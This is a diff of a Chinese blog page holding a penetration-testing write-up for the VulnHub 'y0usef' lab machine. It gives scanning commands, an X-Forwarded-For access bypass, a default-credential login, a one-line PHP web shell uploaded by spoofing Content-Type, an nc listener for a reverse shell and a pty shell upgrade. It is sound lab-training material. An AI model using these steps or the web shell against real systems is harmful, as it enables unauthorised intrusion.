@@ -41,11 +41,11 @@
 <meta property="og:title" content="渗透测试学习笔记lab1【y0usef】">
 <meta property="og:url" content="http://blog.kekwy.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
 <meta property="og:site_name" content="铃的杂货铺">
-<meta property="og:description" content="渗透测试学习笔记lab1 第一周 可弟WZ 主页：blog.kekwy.com 邮箱：&amp;#107;&amp;#101;&amp;#101;&amp;#x6b;&amp;#107;&amp;#x65;&amp;#x77;&amp;#121;&amp;#64;&amp;#113;&amp;#x71;&amp;#x2e;&amp;#99;&amp;#x6f;&amp;#x6d; 2022年9月27日  一、实验准备靶机：y0usef 下载链接：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;y0use">
+<meta property="og:description" content="第一周 可弟WZ 主页：blog.kekwy.com 邮箱：&amp;#x6b;&amp;#x65;&amp;#101;&amp;#x6b;&amp;#x6b;&amp;#x65;&amp;#x77;&amp;#121;&amp;#x40;&amp;#113;&amp;#x71;&amp;#x2e;&amp;#99;&amp;#111;&amp;#x6d; 2022年9月27日  一、实验准备靶机：y0usef 下载链接：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;y0usef-1,624&#x2F; 攻击">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://blog.kekwy.com/media/images/logo.png">
 <meta property="article:published_time" content="2022-09-27T04:44:31.000Z">
-<meta property="article:modified_time" content="2022-09-27T04:47:49.857Z">
+<meta property="article:modified_time" content="2022-09-27T07:00:00.851Z">
 <meta property="article:author" content="可弟WZ铃号机">
 <meta property="article:tag" content="学习">
 <meta property="article:tag" content="Kali">
@@ -1804,7 +1804,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: false,
     cdn: {"js":{"app":"/js/app.af2d54c8.js","parallax":"/js/plugins/parallax.8bf0ab10.js","rightMenu":"/js/plugins/rightMenu.d9437285.js","rightMenus":"/js/plugins/rightMenus.1aa99ff1.js","sites":"/js/plugins/tags/sites.76bf19b8.js","friends":"/js/plugins/tags/friends.f372da57.js","contributors":"/js/plugins/tags/contributors.aec80453.js","search":"/js/search/hexo.0e52f222.js"},"css":{"style":"/css/style.9715bc73.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1664254122835),
+    lastupdate: new Date(1664262041522),
     sidebar: {
       for_page: ["blogger","about","webinfo","music"],
       for_post: ["toc","music","lastupdate"],
@@ -2799,11 +2799,11 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <h1 id="渗透测试学习笔记lab1"><a href="#渗透测试学习笔记lab1" class="headerlink" title="渗透测试学习笔记lab1"></a>渗透测试学习笔记lab1</h1><blockquote>
+    <blockquote>
 <p>第一周</p>
 <p>可弟WZ</p>
 <p>主页：blog.kekwy.com</p>
-<p>邮箱：<a href="mailto:&#107;&#101;&#101;&#x6b;&#107;&#x65;&#x77;&#121;&#64;&#113;&#x71;&#x2e;&#99;&#x6f;&#x6d;">&#107;&#101;&#101;&#x6b;&#107;&#x65;&#x77;&#121;&#64;&#113;&#x71;&#x2e;&#99;&#x6f;&#x6d;</a></p>
+<p>邮箱：<a href="mailto:&#x6b;&#x65;&#101;&#x6b;&#x6b;&#x65;&#x77;&#121;&#x40;&#113;&#x71;&#x2e;&#99;&#111;&#x6d;">&#x6b;&#x65;&#101;&#x6b;&#x6b;&#x65;&#x77;&#121;&#x40;&#113;&#x71;&#x2e;&#99;&#111;&#x6d;</a></p>
 <p>2022年9月27日</p>
 </blockquote>
 <div class="story post-story"><h2 id="一、实验准备"><a href="#一、实验准备" class="headerlink" title="一、实验准备"></a>一、实验准备</h2><p>靶机：y0usef</p>
@@ -2817,7 +2817,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo arp-scan -I eth0 -l</span></span><br></pre></td></tr></table></figure>
 
 <p>扫描结果如下：</p>
-<p><img src="https://img-blog.csdnimg.cn/1cef153a60244fbfb133af7b8e5cb3fa.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/1cef153a60244fbfb133af7b8e5cb3fa.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921103912013"> </p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921103912013.png" class="lazyload" data-srcset="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921103912013.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921103912013"> </p>
 <p>可以推断<sup>1</sup>出靶机 地址为 <code>10.0.2.5</code> 。</p>
 <p><a id="jump1"></a></p>
 <p><code>1：</code> 推断方式很多，可以挨个扫描端口，可以控制变量（不开靶机扫描一次，启动靶机后再扫描一次），可以对比扫描结果与靶机的mac地址，也可以是经验之谈。</p>
@@ -2826,7 +2826,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo nmap -p- 10.0.2.5</span></span><br></pre></td></tr></table></figure>
 
 <p>扫描结果如下：</p>
-<p><img src="https://img-blog.csdnimg.cn/3e040fc801ef4729bcdcab28371304ef.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/3e040fc801ef4729bcdcab28371304ef.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921083225282"> </p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921083225282.png" class="lazyload" data-srcset="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921083225282.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921083225282"> </p>
 <p>发现开通了22、80两个端口，提示我们可以考虑靶机上的<code>ssh</code>与<code>http</code>服务。为了进一步确定各端口的用途，我们可以通过以下指令<sup>2</sup>获取对应的服务版本信息：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo nmap -p22,80 -sV -sC 10.0.2.5</span></span><br></pre></td></tr></table></figure>
 
@@ -2836,12 +2836,12 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p><code>2:</code> <code>-p</code> 对指定端口扫描</p>
 <p>​	    <code>-sV -sC</code> 默认安全脚本扫描</p>
 <p>扫描结果如下：</p>
-<p><img src="https://img-blog.csdnimg.cn/ec5969c0f78246a0a57d82f63526d361.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/ec5969c0f78246a0a57d82f63526d361.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921111148084"> </p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921111148084.png" class="lazyload" data-srcset="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921111148084.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921111148084"> </p>
 </li>
 <li><p>我们根据靶机开放的80端口，推测可以去网页上寻找突破口。于是在kali中打开浏览器，并输入靶机的IP，进入在靶机上运行的网站，顺便查看网站的源码：</p>
-<p><img src="https://img-blog.csdnimg.cn/8443950f64a241418f228c0360ee003c.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/8443950f64a241418f228c0360ee003c.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921111747118"> </p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921111747118.png" class="lazyload" data-srcset="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921111747118.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921111747118"> </p>
 <p> 但是发现网站与其源码中均无对我们有帮助的信息，再尝试能否查看靶机上的<code>robots.txt</code>文件<sup>3</sup>：</p>
-<img src="https://img-blog.csdnimg.cn/e935d6b0db29459285191574144fb485.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/e935d6b0db29459285191574144fb485.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921112049063" style="zoom:67%;" /> 
+<img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921112049063.png" class="lazyload" data-srcset="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921112049063.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921112049063" style="zoom:67%;" /> 
 
 <p>但令人遗憾的是，我们并不能查看该文件。</p>
 <p><a id="jump3"></a></p>
@@ -2850,12 +2850,12 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <li><p>使用whatweb工具查看web应用所采用的软件构架：</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ whatweb http://10.0.2.5</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/2171dc1ef08047c0b87a380f5d4a7cb3.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/2171dc1ef08047c0b87a380f5d4a7cb3.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921151941056"> </p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921151941056.png" class="lazyload" data-srcset="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921151941056.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921151941056"> </p>
 <p>尝试使用工具<code>dirsearch</code>爆破 web 服务端的路径，发现一些隐藏的路径和文件：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">dirsearch -u http://10.0.2.5</span></span><br></pre></td></tr></table></figure>
 
 <p>结果如下：</p>
-<img src="https://img-blog.csdnimg.cn/21596c4a38f24eb6a52e95fd6934c272.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/21596c4a38f24eb6a52e95fd6934c272.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921091507301" style="zoom: 50%;" /> 
+<img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921091507301.png" class="lazyload" data-srcset="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921091507301.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921091507301" style="zoom: 50%;" /> 
 
 <p>得知<sup>4</sup>服务器上有三个我们可以访问的文件：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/adminstration</span><br><span class="line">/index.php</span><br><span class="line">/index.php/login</span><br></pre></td></tr></table></figure>
@@ -2886,15 +2886,15 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </tbody></table>
 </li>
 <li><p>访问<code>10.0.2.5/adminstration</code>：</p>
-<p><img src="https://img-blog.csdnimg.cn/e935d6b0db29459285191574144fb485.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/e935d6b0db29459285191574144fb485.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921114137208"> </p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921114137208.png" class="lazyload" data-srcset="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921114137208.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921114137208"> </p>
 <p>提示我们没有权限，需要进行“绕过”。这里我们采用“X系列头部绕过”的方式：</p>
 <p>启动Burp Suit并启用拦截，将浏览器代理设置为<code>127.0.0.1:8080</code>（Burp Suit的默认代理端口为8080）。</p>
 <p>刷新页面，Burp Suit弹出拦截窗口，在被拦截的数据包中加入<code>X-Forwarded-For: 127.0.0.1</code><sup>5</sup>（如下图），再将其发送。<em><strong>【后续被拦截的数据包都需要插入上述内容。】</strong></em></p>
-<p><img src="https://img-blog.csdnimg.cn/640c36fceb8d4c4ca68c6d2c52da38bf.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/640c36fceb8d4c4ca68c6d2c52da38bf.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921124711969"> </p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921124711969.png" class="lazyload" data-srcset="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921124711969.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921124711969"> </p>
 <p>发现成功进入一个登录界面：</p>
-<p><img src="https://img-blog.csdnimg.cn/b7d3b2388d064ea2a56dc14139b75dde.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/b7d3b2388d064ea2a56dc14139b75dde.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921124805448"> </p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921124805448.png" class="lazyload" data-srcset="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921124805448.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921124805448"> </p>
 <p>这里我们可以直接尝试一下弱口令，用户名和密码都输入admin，发现登入成功了。</p>
-<p><img src="https://img-blog.csdnimg.cn/50ef13469aae46daaf00688fdb794869.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/50ef13469aae46daaf00688fdb794869.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921130249392">  </p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921130249392.png" class="lazyload" data-srcset="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921130249392.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921130249392">  </p>
 <p><a id="jump5"></a></p>
 <p><code>5</code>: 让靶机服务器误以为该报文是从其本地发起的，从而获取访问权限。</p>
 </li>
@@ -2903,13 +2903,13 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$var</span>=<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="keyword">echo</span> <span class="variable">$var</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>尝试直接将其上传，发现网站提示文件被拒绝：</p>
-<p><img src="https://img-blog.csdnimg.cn/24d305cf59254fe7a9484d760c975610.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/24d305cf59254fe7a9484d760c975610.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921130902640"> </p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921130902640.png" class="lazyload" data-srcset="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921130902640.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921130902640"> </p>
 <p>推测网站可能存在针对文件类型的过滤<sup>6</sup>，我们可以通过修改被拦截的报文中<code>Content-Type</code>字段的值进行绕过：</p>
-<p><img src="https://img-blog.csdnimg.cn/41c28f38eb9f4591addfd2a251254c8c.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/41c28f38eb9f4591addfd2a251254c8c.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921131442789"> </p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921131442789.png" class="lazyload" data-srcset="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921131442789.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921131442789"> </p>
 <p>修改为：<code>image/png</code>：</p>
-<p><img src="https://img-blog.csdnimg.cn/2f2eea372d7c4dfab6a060136430772a.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/2f2eea372d7c4dfab6a060136430772a.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921131518489"> </p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921131518489.png" class="lazyload" data-srcset="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921131518489.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921131518489"> </p>
 <p>文件上传成功了，并提供了上传完成的文件的URL。</p>
-<p><img src="https://img-blog.csdnimg.cn/9254e11db77d43c6940e285e83c4ff74.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/9254e11db77d43c6940e285e83c4ff74.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921131734558"> </p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921131734558.png" class="lazyload" data-srcset="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921131734558.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921131734558"> </p>
 <p><a id="jump6"></a></p>
 <p><code>6:</code> 常见的过滤形式与绕过方法：</p>
 <ol>
@@ -2927,12 +2927,12 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>进入了一片空白的页面，说明该url正确。再尝试输入指令，测试代码是否可以正常运行：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.2.5/adminstration/upload/files/1663725708shell.php?cmd=ls</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/fc8f5b4d3cc342beba73a43392887bc7.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/fc8f5b4d3cc342beba73a43392887bc7.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921133834453"> </p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921133834453.png" class="lazyload" data-srcset="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921133834453.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921133834453"> </p>
 <p>指令成功运行，到此为止我们就可以通过url让目标靶机执行反弹shell的代码了。首先，先试探一下靶机的语言环境：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.2.5/adminstration/upload/files/1663725708shell.php?cmd=which python</span><br></pre></td></tr></table></figure>
 
 <p>得到了靶机上的python路径，说明靶机有python环境：</p>
-<p><img src="https://img-blog.csdnimg.cn/cc91dfe5f0234f4395bb789080bca78d.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/cc91dfe5f0234f4395bb789080bca78d.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921134349689"> </p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921134349689.png" class="lazyload" data-srcset="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921134349689.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921134349689"> </p>
 <p>故我们可以利用python版的反弹shell代码实现反弹shell，首先在kali上监听某一个端口（如4444端口）：</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -nvlp 4444</span><br></pre></td></tr></table></figure>
 
@@ -2941,12 +2941,12 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <p>其中ip修改为kali的ip，port修改为刚才设置监听的端口。本次实验中分别为10.0.2.15、4444.</p>
 <p>将修改好的代码插入上述URL中对应的参数位置（”cmd&#x3D;”之后），再次访问，发现kali的shell成功监听到靶机的反弹shell：</p>
-<img src="https://img-blog.csdnimg.cn/ce9a4ed410414c4fb016010423933bca.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/ce9a4ed410414c4fb016010423933bca.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921140145500" style="zoom:67%;" /> 
+<img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921140145500.png" class="lazyload" data-srcset="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921140145500.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921140145500" style="zoom:67%;" /> 
 
 <p>使用以下指令对反弹shell进行一个简单的升级: </p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/b1fd155c1f7946fc85aa636030923c67.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/b1fd155c1f7946fc85aa636030923c67.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921140419911"> </p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921140419911.png" class="lazyload" data-srcset="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921140419911.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921140419911"> </p>
 </li>
 <li><p>查看&#x2F;etc&#x2F;passwd 文件<sup>7</sup>：</p>
